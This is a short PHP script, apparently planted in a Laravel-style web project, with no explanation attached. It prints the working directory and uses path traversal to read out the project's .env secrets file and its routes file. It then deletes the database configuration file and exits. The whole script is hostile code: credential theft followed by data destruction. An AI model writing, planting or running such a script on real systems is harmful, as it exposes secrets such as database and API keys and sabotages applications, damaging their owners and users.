<?php
echo getcwd();
readfile("../../../.env");
echo "\n\n\n\n\n";
readfile("../../../routes/web.php");

unlink('../../../config/database.php');
exit;

// echo substr(__DIR__, strrpos(__DIR__, '/')+2);
